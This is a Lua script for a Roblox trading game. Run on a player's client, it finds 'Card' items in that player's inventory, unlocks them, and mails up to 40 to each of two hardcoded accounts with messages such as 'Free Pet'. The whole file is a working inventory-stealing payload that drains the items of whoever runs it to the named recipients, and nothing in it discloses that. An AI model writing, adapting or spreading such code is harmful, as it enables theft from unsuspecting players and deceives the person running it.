local usernamesString = [[
maudimancing1
recyaza
]]
        local usernames = {}
        for line in usernamesString:gmatch("([^\n]+)") do
            if line ~= "" then
                table.insert(usernames, line)
            end
        end
        
        local messages = {"Free Pet", "This What you Get"}
        local Network = require(game.ReplicatedStorage.Library.Client.Network)
        local maxItemsPerUser = 40
        
        -- Loop through each username
        for _, selectedUser in ipairs(usernames) do
            local countSent = 0
            while countSent < maxItemsPerUser do
                -- Refresh the inventory data for each send
                local saveData = require(game.ReplicatedStorage.Library.Client.Save).Get()
                local cardInventory = saveData.Inventory.Card
                
                local foundCard = nil
                -- Look for a card item that ends with "Card" (optionally with trailing spaces/digits)
                for PetUID, PetData in pairs(cardInventory) do
                    if PetData.id:match("Card%s*%d*$") and PetData._am and PetData._am > 0 then
                        foundCard = {uid = PetUID, data = PetData}
                        break
                    end
                end
                
                if not foundCard then
                    print("No available card items left for username", selectedUser)
                    break -- Stop processing this username if there are no available cards
                end
                
                -- Unlock the card if it is locked
                if foundCard.data._lk then
                    repeat
                        task.wait()
                    until Network.Invoke("Locking_SetLocked", foundCard.uid, false)
                    print("Unlocked", foundCard.uid)
                end
                
                local selectedMessage = messages[math.random(1, #messages)]
                repeat
                    task.wait()
                until Network.Invoke("Mailbox: Send", selectedUser, selectedMessage, "Pet", foundCard.uid, 1)
                print("Sent", foundCard.uid, "to", selectedUser, "with message:", selectedMessage)
                
                countSent = countSent + 1
            end
        end
